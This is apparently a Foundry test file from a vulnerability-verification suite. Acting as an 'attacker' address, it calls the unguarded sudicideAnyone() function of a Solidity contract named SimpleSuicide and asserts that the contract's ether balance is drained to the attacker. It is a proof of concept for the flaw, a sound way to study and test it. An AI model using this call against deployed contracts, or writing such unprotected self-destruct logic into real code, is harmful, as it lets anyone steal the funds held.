// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/simple_suicide.sol";

contract SimpleSuicideTest is Test {
    SimpleSuicide public suicideContract;
    address public attacker = makeAddr("attacker");
    
    function setUp() public {
        // Deploy contract
        suicideContract = new SimpleSuicide();
        
        // Fund the contract
        vm.deal(address(suicideContract), 1 ether);
    }

    function test_anyone_can_destroy_contract() public {
        // ======== BEFORE-Trigger State ========
        console2.log("--- BEFORE-Trigger State ---");
        uint256 initialContractBalance = address(suicideContract).balance;
        uint256 initialAttackerBalance = attacker.balance;
        console2.log("Initial contract balance: %s wei", initialContractBalance);
        console2.log("Initial attacker balance: %s wei", initialAttackerBalance);
        assertEq(initialContractBalance, 1 ether, "Initial contract balance should be 1 ether");

        // ======== Trigger Attack Operation ========
        console2.log("--- Trigger SudicideAnyone ---");
        vm.prank(attacker);
        suicideContract.sudicideAnyone();

        // ======== AFTER-Trigger State ========
        console2.log("--- AFTER-Trigger State ---");
        uint256 finalContractBalance = address(suicideContract).balance;
        uint256 finalAttackerBalance = attacker.balance;
        console2.log("Final contract balance: %s wei", finalContractBalance);
        console2.log("Final attacker balance: %s wei", finalAttackerBalance);

        // ======== Validate State Changes ========
        bool contractDestroyed = finalContractBalance == 0;
        bool fundsStolen = finalAttackerBalance == initialAttackerBalance + initialContractBalance;
        bool attackSuccessful = contractDestroyed && fundsStolen;

        console2.log("Contract destroyed:", contractDestroyed ? "Yes" : "No");
        console2.log("Funds stolen:", fundsStolen ? "Yes" : "No");

        // ======== Vulnerability Verification ========
        if (attackSuccessful) {
            console2.log("Vulnerability Exists: Attacker can destroy contract and steal funds");
        } else {
            console2.log("Vulnerability not Exist: Contract not destroyed or funds not stolen");
        }

        // Test assertions
        assertEq(finalContractBalance, 0, "Contract balance should be 0 after selfdestruct");
        assertEq(
            finalAttackerBalance,
            initialAttackerBalance + initialContractBalance,
            "Attacker should receive full contract balance"
        );
    }
}